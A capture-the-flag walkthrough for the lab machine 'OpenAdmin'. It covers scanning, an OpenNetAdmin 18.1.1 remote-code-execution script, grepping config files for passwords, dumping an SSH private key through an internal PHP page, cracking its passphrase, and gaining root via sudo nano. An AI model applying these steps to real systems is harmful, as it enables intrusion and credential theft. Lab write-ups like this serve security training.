# OpenAdmin walkthroughs

Machine ip: 10.10.10.171

Running ```nmap ``` gave this output:

```console
root@kali:~# nmap -sV -T4 -sC 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-14 23:36 EST
Nmap scan report for 10.10.10.171
Host is up (0.0094s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## User

We are going to enumerate with Dirbuster, to visualize different paths, which may contain
vulnerabilities, using the medium wordlist

Connecting instead to 10.10.10.171/ona, we have a web app called OpenNetAdmin, version
18.1.1. Googling opennetadmin 18.1.1 shows it's vulnrable to RCE, I also find the exploit code (located in RCE.sh).

Running:

```console
root@kali: ~./RCE.sh http://10.10.10.171/ona/
```

Gives me a shell:

```console
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

So, we managed to get the www-data user shell, and now we can browse inside to find out more.
The database configuration file shows a plaintext password.

Grep to loot for passwords in apache config files:
```console
$ grep -nr 'pass' .
Found a couple passwords:
../../ona/www/local/config/database_settings.inc.php:13:        'db_passwd' => n1nj4W4rri0R!',
./include/adodb5/drivers/adodb-postgres64.inc.php:757:  //      $db->PConnect("host=host1 user=user1 password=secret port=4341");
./include/adodb5/datadict/datadict-oci8.inc.php:111:            $password = isset($options['PASSWORD']) ? $options['PASSWORD'] : 'tiger';
```

I then try to login using the above passwords to the two user accounts on the machine. 'n1nj4W4rri0R!' Worked for Jimmy through ssh

I used LinEnum. Looking through, I see apache and a curious file I wasn't able to see before at:

> /var/www/internal/main.php

The contents are:

```php
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
```
Hmm, I can't execute the .php file or access joanna's home directory - what can I do?

I see on the LinEnum report it's listening at port 52846, so cURLing localhost:52846 dumps Joanna's SSH key!

Now it's time to ask John to crack the password:

> bloodninjas

SSH into joanna's account and grab the user flag

## Root

Check what Joanna can run without supplying a password:
```console
joanna@openadmin:~$ sudo -l
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
Joanna can use nano, so running:

```console
joanna@openadmin:~$ sudo -u root nano /opt/priv
```

Gives me nano as root, CTRL-R + CTRL-X allows me to execute whatever I like with my new found privileges!

[In Nano]
```console
Command to execute: id

uid=0(root) gid=0(root) groups=0(root)

Command to execute: cat /root/root.txt
```
